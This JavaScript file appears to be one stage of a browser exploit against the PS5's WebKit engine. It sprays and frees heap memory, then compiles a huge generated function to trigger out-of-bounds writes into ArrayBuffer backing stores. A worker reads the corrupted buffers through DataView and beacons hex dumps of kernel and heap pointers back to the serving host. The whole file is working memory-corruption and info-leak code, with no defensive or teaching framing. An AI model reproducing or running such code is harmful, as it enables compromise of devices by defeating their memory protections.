// p166 — ArrayBuffer/DataView extraction (NO Gigacage on PS5)
//
// BREAKTHROUGH: Gigacage is DISABLED on PS5 (FreeBSD, not Darwin/Linux).
// ArrayBuffer backing stores use the same FastMalloc heap as StringImpl
// and MetadataTable. OOB writes from finishCreation corrupt ArrayBuffer
// backing stores, readable through DataView — arbitrary byte reads,
// no pointer indirection, no crash.
//
// Each 100KB ArrayBuffer contains ~893 metadata entries (112B each).
// Code pointer (m_slowPathCallDestination) at entry+24, every 112B.
// DataView.getUint32(offset, true) reads any 4 bytes.
//
// Beacon prefix: V166-

(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V166-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  }
  function hx8(v) {
    var s = (v >>> 0).toString(16);
    while (s.length < 8) s = '0' + s;
    return s;
  }

  B('BOOT');

  // ── WORKER ──
  var workerCode = function() {
    var bufs = [];
    var views = [];
    var baseUrl = '';

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V166-W-' + tag + '?t=' + Date.now(), true);
        x.send();
      } catch(e) {}
    }
    function hx8(v) {
      var s = (v >>> 0).toString(16);
      while (s.length < 8) s = '0' + s;
      return s;
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        var count = e.data.count;
        var size = e.data.size;
        for (var i = 0; i < count; i++) {
          var buf = new ArrayBuffer(size);
          var view = new DataView(buf);
          bufs.push(buf);
          views.push(view);
        }
        beacon('TARGETS-' + count + 'x' + size);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCHING');
        var found = -1;
        var iters = 0;

        // Poll for corruption: ArrayBuffers are zero-initialized.
        // Check 4 offsets per buffer (spread across 112B entry stride)
        // to handle unknown phase alignment.
        while (found < 0) {
          for (var i = 0; i < views.length; i++) {
            if (views[i].getUint32(0, true) !== 0 ||
                views[i].getUint32(24, true) !== 0 ||
                views[i].getUint32(56, true) !== 0 ||
                views[i].getUint32(100, true) !== 0) {
              found = i;
              break;
            }
          }
          iters++;
          if (iters % 500000 === 0) beacon('POLL-' + iters);
          if (iters > 50000000) { beacon('TIMEOUT'); return; }
        }

        beacon('HIT-' + found);

        // Count corrupted buffers
        var corrupted = [];
        for (var i = 0; i < views.length; i++) {
          var v = views[i];
          if (v.getUint32(0, true) !== 0 || v.getUint32(24, true) !== 0 ||
              v.getUint32(56, true) !== 0 || v.getUint32(100, true) !== 0) {
            corrupted.push(i);
          }
        }
        beacon('CORRUPT-' + corrupted.length + '/' + views.length);

        // ── EXTRACT: dump first 224 bytes (2 full entries) of first corrupted buffer ──
        var ci = corrupted[0];
        var v = views[ci];

        // Raw hex dump: bytes 0-111 (first entry)
        var hex1 = '';
        for (var b = 0; b < 112; b += 4) {
          hex1 += hx8(v.getUint32(b, true));
        }
        beacon('E0A=' + hex1.substring(0, 200));
        if (hex1.length > 200) beacon('E0B=' + hex1.substring(200));

        // Raw hex dump: bytes 112-223 (second entry)
        var hex2 = '';
        for (var b = 112; b < 224; b += 4) {
          hex2 += hx8(v.getUint32(b, true));
        }
        beacon('E1A=' + hex2.substring(0, 200));
        if (hex2.length > 200) beacon('E1B=' + hex2.substring(200));

        // ── FIND CODE POINTER: scan for kernel text pattern ──
        // PS5 kernel text: 0xffffffff8xxxxxxx
        // Upper 4 bytes = 0xffffffff (or 0xffffffxx)
        // Scan first 1000 bytes for this pattern
        var ptrs = '';
        for (var off = 0; off < 1000; off += 4) {
          var hi = v.getUint32(off + 4, true);
          if ((hi >>> 16) === 0xffff || (hi >>> 24) === 0xff) {
            var lo = v.getUint32(off, true);
            ptrs += off + ':' + hx8(hi) + hx8(lo) + ',';
          }
        }
        if (ptrs) {
          beacon('PTRS-A=' + ptrs.substring(0, 200));
          if (ptrs.length > 200) beacon('PTRS-B=' + ptrs.substring(200, 400));
        } else {
          beacon('PTRS-NONE');
        }

        // ── FIND HEAP POINTERS: scan for typical heap address patterns ──
        // PS5 user heap likely in range 0x00007fxxxxxxxxxx or 0x0000xxxxxxxxxxxx
        var hptrs = '';
        for (var off = 0; off < 448; off += 4) {
          var hi = v.getUint32(off + 4, true);
          var lo = v.getUint32(off, true);
          // Non-zero, looks like a pointer (upper bits non-zero but < 0x0001)
          if (hi !== 0 && hi < 0x00010000 && lo !== 0) {
            hptrs += off + ':' + hx8(hi) + hx8(lo) + ',';
          }
        }
        if (hptrs) beacon('HPTRS=' + hptrs.substring(0, 200));

        // ── SECOND BUFFER for comparison ──
        if (corrupted.length > 1) {
          var ci2 = corrupted[1];
          var v2 = views[ci2];
          // Dump entry+24 region from second buffer
          var hex3 = '';
          for (var b = 0; b < 112; b += 4) {
            hex3 += hx8(v2.getUint32(b, true));
          }
          beacon('S2=' + hex3.substring(0, 200));
          if (hex3.length > 200) beacon('S2B=' + hex3.substring(200));
        }

        // ── ENTRY STRIDE DETECTION ──
        // Find repeating pattern to confirm 112-byte entry stride
        // Check if value at offset X equals value at offset X+112
        var strideMatch = 0;
        for (var off = 0; off < 112; off += 4) {
          if (v.getUint32(off, true) === v.getUint32(off + 112, true) &&
              v.getUint32(off, true) !== 0) {
            strideMatch++;
          }
        }
        beacon('STRIDE112-MATCH=' + strideMatch + '/28');

        // Also check 224-byte stride (every other entry should match)
        // and key offsets
        var confirmPtrs = '';
        for (var entry = 0; entry < 4; entry++) {
          var base = entry * 112;
          if (base + 32 > views[ci].byteLength) break;
          var lo = v.getUint32(base + 24, true);
          var hi = v.getUint32(base + 28, true);
          confirmPtrs += 'e' + entry + ':' + hx8(hi) + hx8(lo) + ',';
        }
        beacon('CODEPTR-4E=' + confirmPtrs);

        beacon('DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // ── PHASE 1: BAIT STRINGS (50 × 100KB = 5MB writable heap) ──
  var N_BAIT = 50;
  B('BAIT-START');
  var baits = [];
  var baitChunk = '';
  for (var k = 0; k < 100; k++) baitChunk += 'BBBBBBBBBB';
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < 100000; j += 1000) bait += baitChunk;
    bait = bait.substring(0, 100000);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  baitChunk = null;
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 2: WORKER ALLOCATES ARRAYBUFFER TARGETS ──
  // 14 ArrayBuffers × 100KB each — same size as baits for heap alignment
  worker.onmessage = function(e) {
    if (e.data.ready) phaseFreeBaits();
  };
  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc', count: 14, size: 100000 });

  // ── PHASE 3: FREE BAITS + GC ──
  function phaseFreeBaits() {
    B('FREE-START');
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;

    var gcRound = 0;
    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 40) setTimeout(gcPressureRound, 25);
      else { B('GC-DONE-' + gcRound); phaseBuild(); }
    }
    gcPressureRound();
  }

  // ── PHASE 4: BUILD + CALL ──
  function phaseBuild() {
    B('BUILD-START');

    // Start worker watching BEFORE compilation
    worker.postMessage({ cmd: 'watch' });

    var N = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N / CHUNK);
    var REM = N - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v166fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v166ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v166ok ? 'OK' : 'FAIL'));
      if (!window.__v166fn) { B('NO-FN'); return; }

      setTimeout(function() {
        B('CALLING');
        try {
          window.__v166fn(function(){});
        } catch(ex) {
          B('CATCH-' + String(ex).substring(0, 40));
        }
        B('SURVIVED');
      }, 500);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
